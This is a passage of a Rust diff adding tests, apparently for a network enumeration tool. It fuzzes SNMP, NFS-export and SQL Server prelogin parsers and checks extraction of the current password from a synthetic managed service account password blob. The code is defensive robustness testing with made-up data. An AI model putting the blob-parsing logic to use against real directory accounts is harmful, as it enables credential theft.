+            let n = (self.next() as usize) % (max + 1);
+            (0..n).map(|_| self.next() as u8).collect()
+        }
+    }
+
+    /// Feed random + seed-mutated byte buffers to a parser; fail with a repro on any panic.
+    fn fuzz<F: Fn(&[u8]) + std::panic::RefUnwindSafe>(name: &str, seeds: &[&[u8]], f: F) {
+        let prev = std::panic::take_hook();
+        std::panic::set_hook(Box::new(|_| {})); // silence expected-during-fuzz panic spew
+        let mut rng = Rng(0x9E37_79B9_7F4A_7C15 ^ name.bytes().map(|b| b as u64).sum::<u64>());
+        let mut fail = None;
+        for _ in 0..200_000 {
+            // Half pure-random, half a mutated copy of a valid seed.
+            let mut buf = rng.bytes(320);
+            if !seeds.is_empty() && rng.next() & 1 == 0 {
+                let mut s = seeds[(rng.next() as usize) % seeds.len()].to_vec();
+                for _ in 0..(rng.next() as usize % 8) {
+                    if !s.is_empty() {
+                        let i = (rng.next() as usize) % s.len();
+                        s[i] = rng.next() as u8;
+                    }
+                }
+                buf = s;
+            }
+            let b = buf.clone();
+            if std::panic::catch_unwind(|| f(&b)).is_err() {
+                fail = Some(buf);
+                break;
+            }
+        }
+        std::panic::set_hook(prev);
+        if let Some(buf) = fail {
+            panic!(
+                "{name} PANICKED on input ({} bytes): {}",
+                buf.len(),
+                hex_dump(&buf)
+            );
+        }
+    }
+
+    fn hex_dump(b: &[u8]) -> String {
+        b.iter().map(|x| format!("{x:02x}")).collect()
+    }
+
+    #[test]
+    fn fuzz_network_parsers() {
+        // These parse bytes from arbitrary remote hosts (SNMP/NFS/TDS) — must never panic.
+        let snmp_seed = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), ber(0xa2, &[])].concat());
+        fuzz("snmp_first_octet_string", &[&snmp_seed], |b| {
+            let _ = snmp_first_octet_string(b);
+        });
+        let mut nfs_seed = vec![0u8; 24];
+        nfs_seed.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 5]);
+        nfs_seed.extend_from_slice(b"/data\0\0\0");
+        fuzz("parse_exports", &[&nfs_seed], |b| {
+            let _ = parse_exports(b);
+        });
+        fuzz("parse_prelogin", &[], |b| {
+            let _ = parse_prelogin(b);
+        });
+    }
+
+    #[test]
+    fn managed_password_blob_extracts_current() {
+        let mut b = vec![1, 0, 0, 0]; // version + reserved
+        b.extend_from_slice(&0u32.to_le_bytes()); // length
+        b.extend_from_slice(&16u16.to_le_bytes()); // CurrentPasswordOffset
+        b.extend_from_slice(&0u16.to_le_bytes()); // PreviousPasswordOffset = none
+        b.extend_from_slice(&0u16.to_le_bytes()); // QueryPasswordInterval
+        b.extend_from_slice(&0u16.to_le_bytes()); // UnchangedPasswordInterval
+        b.extend_from_slice(&[0xAB; 256]); // CurrentPassword
+        let pw = parse_managed_password_blob(&b).unwrap();
+        assert_eq!(pw.len(), 256);
+        assert!(pw.iter().all(|&x| x == 0xAB));
+    }
+
+    #[test]
+    fn prelogin_reads_version_and_encryption() {
+        // VERSION @12 (16.0.1000), ENCRYPTION @18 = 0x03 (REQUIRED).
+        let mut body = vec![
+            0x00, 0x00, 12, 0x00, 6, // VERSION token
+            0x01, 0x00, 18, 0x00, 1,    // ENCRYPTION token
+            0xff, // terminator
+        ];
+        while body.len() < 12 {
+            body.push(0);
+        }
+        body.extend_from_slice(&[16, 0, 0x03, 0xe8, 0, 0]); // 16.0.1000
+        body.push(0x03); // ENCRYPT_REQ
+        let (v, e) = parse_prelogin(&body);
+        assert_eq!(v.as_deref(), Some("16.0.1000"));
+        assert_eq!(e, Some(0x03));
+    }
+}
